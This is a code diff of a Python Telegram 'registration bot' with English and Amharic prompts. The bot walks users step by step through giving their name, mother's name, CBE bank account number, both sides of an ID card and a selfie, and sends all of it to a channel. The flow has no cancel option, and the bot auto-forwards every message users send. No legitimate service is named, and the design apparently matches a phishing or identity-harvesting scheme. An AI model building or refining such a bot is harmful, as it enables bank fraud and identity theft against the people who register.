@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Telegram Registration Bot — Sequential Flow + Auto-Forward
-Bilingual (English + አማርኛ) • Start Button • No Cancel • All to Channel
+Bilingual (English + አማርኛ) • 7 Steps • No Cancel • All to Channel
 """
 
 import os
@@ -58,31 +58,13 @@ def health():
 FIRST, LAST, MOTHER, CBE, FRONT, BACK, PHOTO = range(7)
 
 # ══════════════════════════
-# CONSTANTS
-# ══════════════════════════
-BTN_START = "🚀 Start Service | አገልግሎት ጀምር"
-
-# ══════════════════════════
-# KEYBOARD
-# ══════════════════════════
-def start_button():
-    return ReplyKeyboardMarkup(
-        [[KeyboardButton(BTN_START)]],
-        resize_keyboard=True,
-        one_time_keyboard=False,
-    )
-
-def hide():
-    return ReplyKeyboardRemove()
-
-# ══════════════════════════
 # MESSAGES
 # ══════════════════════════
 
 WELCOME = (
     "🌟 *Welcome! | እንኳን ደህና መጡ!* 🌟\n\n"
-    "_Click the button below to start your registration._\n"
-    "_እባክዎ ምዝገባዎን ለመጀመር ከታች ያለውን ቁልፍ ይጫኑ።_"
+    "_Send /register to begin._\n"
+    "_ለመጀመር /register ይላኩ።_"
 )
 
 PROMPTS = [
@@ -200,22 +182,13 @@ async def forward_to_channel(update: Update, context: ContextTypes.DEFAULT_TYPE)
 # ══════════════════════════
 
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """ /start — Show welcome with button """
-    context.user_data.clear()
-    await update.message.reply_text(
-        WELCOME,
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=start_button(),
-    )
+    """ /start """
+    await update.message.reply_text(WELCOME, parse_mode=ParseMode.MARKDOWN)
     log.info(f"/start | User={update.effective_user.id}")
-    return ConversationHandler.END
 
 
-async def btn_start_service(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """User clicks Start Service button → Begin sequential flow"""
-    if update.message.text != BTN_START:
-        return ConversationHandler.END
-
+async def cmd_register(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """ /register — Start the sequential flow """
     context.user_data.clear()
     context.user_data["reg"] = {}
 
@@ -224,73 +197,57 @@ async def btn_start_service(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "_Answer each question one by one._\n"
         "_እያንዳንዱን ጥያቄ አንድ በአንድ ይመልሱ።_",
         parse_mode=ParseMode.MARKDOWN,
-        reply_markup=hide(),
     )
     await update.message.reply_text(PROMPTS[0], parse_mode=ParseMode.MARKDOWN)
-    log.info(f"Start Service | User={update.effective_user.id}")
+    log.info(f"Register | User={update.effective_user.id}")
     return FIRST
 
 
 async def step_first(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Step 1: First Name"""
     context.user_data["reg"]["first_name"] = update.message.text.strip()
-    log.info(f"Step 1 | User={update.effective_user.id} | {update.message.text}")
     await update.message.reply_text(PROMPTS[1], parse_mode=ParseMode.MARKDOWN)
     return LAST
 
 
 async def step_last(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Step 2: Last Name"""
     context.user_data["reg"]["last_name"] = update.message.text.strip()
-    log.info(f"Step 2 | User={update.effective_user.id} | {update.message.text}")
     await update.message.reply_text(PROMPTS[2], parse_mode=ParseMode.MARKDOWN)
     return MOTHER
 
 
 async def step_mother(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Step 3: Mother's Name"""
     context.user_data["reg"]["mothers_name"] = update.message.text.strip()
-    log.info(f"Step 3 | User={update.effective_user.id} | {update.message.text}")
     await update.message.reply_text(PROMPTS[3], parse_mode=ParseMode.MARKDOWN)
     return CBE
 
 
 async def step_cbe(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Step 4: CBE Account"""
     context.user_data["reg"]["cbe_account"] = update.message.text.strip()
-    log.info(f"Step 4 | User={update.effective_user.id} | {update.message.text}")
     await update.message.reply_text(PROMPTS[4], parse_mode=ParseMode.MARKDOWN)
     return FRONT
 
 
 async def step_front(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Step 5: Front ID Photo"""
     if not update.message.photo:
         await update.message.reply_text(ERR_PHOTO, parse_mode=ParseMode.MARKDOWN)
         return FRONT
-
     file = await update.message.photo[-1].get_file()
     context.user_data["reg"]["front_id"] = file.file_id
-    log.info(f"Step 5 | User={update.effective_user.id} | Photo received")
     await update.message.reply_text(PROMPTS[5], parse_mode=ParseMode.MARKDOWN)
     return BACK
 
 
 async def step_back(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Step 6: Back ID Photo"""
     if not update.message.photo:
         await update.message.reply_text(ERR_PHOTO, parse_mode=ParseMode.MARKDOWN)
         return BACK
-
     file = await update.message.photo[-1].get_file()
     context.user_data["reg"]["back_id"] = file.file_id
-    log.info(f"Step 6 | User={update.effective_user.id} | Photo received")
     await update.message.reply_text(PROMPTS[6], parse_mode=ParseMode.MARKDOWN)
     return PHOTO
 
 
 async def step_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Step 7: Personal Photo → FINISH"""
     if not update.message.photo:
         await update.message.reply_text(ERR_PHOTO, parse_mode=ParseMode.MARKDOWN)
         return PHOTO
@@ -300,16 +257,8 @@ async def step_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["reg"]["personal_photo"] = file.file_id
     data = context.user_data["reg"]
 
-    log.info(f"Step 7 | User={uid} | Complete!")
+    await update.message.reply_text(done(data), parse_mode=ParseMode.MARKDOWN)
 
-    # ── Show completion ──
-    await update.message.reply_text(
-        done(data),
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=start_button(),
-    )
-
-    # ── Send to channel ──
     if CHANNEL:
         try:
             await context.bot.send_message(
@@ -325,7 +274,6 @@ async def step_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 fid = data.get(key)
                 if fid:
                     await context.bot.send_photo(chat_id=CHANNEL, photo=fid, caption=cap)
-
             log.info(f"✅ Sent to channel | User={uid}")
         except Exception as e:
             log.error(f"Channel error: {e}")
@@ -340,11 +288,8 @@ async def step_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def build():
     app = ApplicationBuilder().token(TOKEN).build()
 
-    # Sequential registration flow — triggered by button click
     conv = ConversationHandler(
-        entry_points=[
-            MessageHandler(filters.TEXT & ~filters.COMMAND, btn_start_service),
-        ],
+        entry_points=[CommandHandler("register", cmd_register)],
         states={
             FIRST:  [MessageHandler(filters.TEXT & ~filters.COMMAND, step_first)],
             LAST:   [MessageHandler(filters.TEXT & ~filters.COMMAND, step_last)],
@@ -354,7 +299,7 @@ def build():
             BACK:   [MessageHandler(filters.PHOTO, step_back)],
             PHOTO:  [MessageHandler(filters.PHOTO, step_photo)],
         },
-        fallbacks=[],  # No cancel — must complete
+        fallbacks=[],  # ⬅️ NO CANCEL — must complete!
         allow_reentry=True,
         per_message=False,
     )
@@ -362,11 +307,7 @@ def build():
     app.add_handler(conv)
     app.add_handler(CommandHandler("start", cmd_start))
 
-    # ⭐ Auto-forward ALL messages to channel
-    app.add_handler(
-        MessageHandler(filters.ALL, forward_to_channel),
-        group=999,
-    )
+    app.add_handler(MessageHandler(filters.ALL, forward_to_channel), group=999)
 
     return app
 
@@ -384,5 +325,5 @@ if __name__ == "__main__":
     log.info(f"Health server on port {PORT}")
 
     bot = build()
-    log.info("✅ Bot running — Start Button + Sequential + Auto-forward!")
+    log.info("✅ Bot running — No cancel, must complete!")
     bot.run_polling(allowed_updates=Update.ALL_TYPES)
